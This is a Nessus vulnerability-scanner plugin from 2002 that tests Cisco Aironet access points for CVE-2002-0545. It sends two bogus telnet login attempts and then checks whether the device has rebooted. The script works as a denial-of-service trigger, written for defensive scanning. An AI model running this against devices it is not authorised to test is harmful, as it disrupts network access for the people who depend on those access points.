#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11014);
 script_bugtraq_id(4461);
 script_cve_id("CVE-2002-0545");
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "Cisco Aironet Telnet DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to reboot the remote host by connecting to the telnet
port and providing a bad username and password.
	

This vulnerability is documented as Cisco Bug ID CSCdw81244.

An attacker may use this flaw to prevent your access point from
working properly.

Solution : http://www.cisco.com/warp/public/707/Aironet-Telnet.shtml
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for CSCdw81244";
 script_summary(english:summary["english"]);
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CISCO";
 family["francais"] = "CISCO";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/telnet", 23);
 exit(0);
}

#
# The script code starts here
#

include('telnet_func.inc');
port=get_kb_item("Services/telnet");
if(!port)port=23;


# we don't use start_denial/end_denial because they
# might be too slow (the device takes a short time to reboot)

alive = tcp_ping(port:port);
if(alive)
{
 if(!get_port_state(port))exit(0);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 buf = telnet_negotiate(socket:soc);
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 close(soc);
 
 sleep(1);
 alive = tcp_ping(port:port);
 if(!alive)security_hole(port);
}


